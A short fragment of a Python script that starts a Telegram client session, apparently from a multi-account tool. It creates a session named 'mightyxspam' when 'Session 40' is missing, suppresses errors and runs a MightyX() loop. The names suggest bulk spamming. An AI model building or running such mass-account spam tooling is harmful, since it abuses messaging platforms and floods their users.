        except Exception as e:
            print(e)
            pass
    else:
        print("Session 40 not Found")
        session_name = "mightyxspam"
        Mig40 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig40.start()
        except Exception as e:
            pass

loop = asyncio.get_event_loop()
loop.run_until_complete(MightyX())
